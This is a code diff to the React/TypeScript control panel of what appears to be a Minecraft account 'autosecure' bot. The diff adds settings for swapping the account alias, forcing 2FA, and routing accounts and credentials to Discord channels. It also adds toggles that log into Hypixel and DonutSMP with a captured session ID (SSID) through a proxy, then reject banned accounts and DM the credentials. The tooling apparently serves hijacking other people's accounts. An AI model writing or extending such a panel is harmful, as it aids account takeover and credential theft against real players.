@@ -20,7 +20,20 @@ type PostVerificationAction = {
 
 type BotConfigData = {
   owners: number[];
-  autosecure: { replace_main_alias: boolean; enable_2fa: boolean; minecon_mode: boolean };
+  autosecure: {
+    replace_main_alias: boolean;
+    enable_2fa: boolean;
+    minecon_mode: boolean;
+    reject?: {
+      check_hypixel_ban?: boolean;
+      check_donutsmp_ban?: boolean;
+      family_locked?: boolean;
+      family_members?: boolean;
+      gamepass?: boolean;
+      underage?: boolean;
+      min_age_years?: number;
+    };
+  };
   discord: {
     logs_channel: string;
     accounts_channel: string;
@@ -122,15 +135,31 @@ export function BotConfigPanel() {
     setSavingStatus(false);
   };
 
-  const toggleAutosecure = async (field: "replace_main_alias" | "enable_2fa" | "minecon_mode", val: boolean) => {
+  const toggleAutosecure = async (
+    field: "replace_main_alias" | "enable_2fa" | "minecon_mode" | "check_hypixel_ban" | "check_donutsmp_ban",
+    val: boolean,
+  ) => {
     if (!cfg) return;
-    const next = { ...cfg.autosecure, [field]: val };
-    setCfg({ ...cfg, autosecure: next });
+    const reject = { ...(cfg.autosecure.reject || {}) };
+    let nextAutosecure = { ...cfg.autosecure };
+    if (field === "check_hypixel_ban" || field === "check_donutsmp_ban") {
+      reject[field] = val;
+      nextAutosecure = { ...nextAutosecure, reject };
+    } else {
+      nextAutosecure = { ...nextAutosecure, [field]: val };
+    }
+    setCfg({ ...cfg, autosecure: nextAutosecure });
     setSavingSecure(true);
     const res = await fetch("/api/bot/autosecure", {
       method: "POST",
       headers: { "Content-Type": "application/json", ...authHeaders() },
-      body: JSON.stringify(next),
+      body: JSON.stringify({
+        replace_main_alias: nextAutosecure.replace_main_alias,
+        enable_2fa: nextAutosecure.enable_2fa,
+        minecon_mode: nextAutosecure.minecon_mode,
+        check_hypixel_ban: !!nextAutosecure.reject?.check_hypixel_ban,
+        check_donutsmp_ban: !!nextAutosecure.reject?.check_donutsmp_ban,
+      }),
     });
     if (!res.ok) toast.error("Failed to save");
     setSavingSecure(false);
@@ -476,6 +505,30 @@ export function BotConfigPanel() {
                   className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.enable_2fa ? "bg-green-500" : "bg-zinc-600"}`}
                 >
                   <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.enable_2fa ? "translate-x-5" : "translate-x-0"}`} />
+                </button>
+              </div>
+              <div className="flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3">
+                <div>
+                  <p className="text-sm font-medium">Check Hypixel ban</p>
+                  <p className="text-xs text-muted-foreground">After secure, join mc.hypixel.net with the account SSID via ColdProxy. Reject + DM creds if banned.</p>
+                </div>
+                <button
+                  onClick={() => toggleAutosecure("check_hypixel_ban", !cfg?.autosecure.reject?.check_hypixel_ban)}
+                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.reject?.check_hypixel_ban ? "bg-green-500" : "bg-zinc-600"}`}
+                >
+                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.reject?.check_hypixel_ban ? "translate-x-5" : "translate-x-0"}`} />
+                </button>
+              </div>
+              <div className="flex items-center justify-between rounded-xl border border-border bg-background/30 px-4 py-3">
+                <div>
+                  <p className="text-sm font-medium">Check DonutSMP ban</p>
+                  <p className="text-xs text-muted-foreground">After secure, join donutsmp.net with the account SSID via ColdProxy. Reject + DM creds if banned.</p>
+                </div>
+                <button
+                  onClick={() => toggleAutosecure("check_donutsmp_ban", !cfg?.autosecure.reject?.check_donutsmp_ban)}
+                  className={`relative h-6 w-11 rounded-full transition ${cfg?.autosecure.reject?.check_donutsmp_ban ? "bg-green-500" : "bg-zinc-600"}`}
+                >
+                  <span className={`absolute left-0.5 top-0.5 h-5 w-5 rounded-full bg-white shadow transition-transform ${cfg?.autosecure.reject?.check_donutsmp_ban ? "translate-x-5" : "translate-x-0"}`} />
                 </button>
               </div>
             </div>
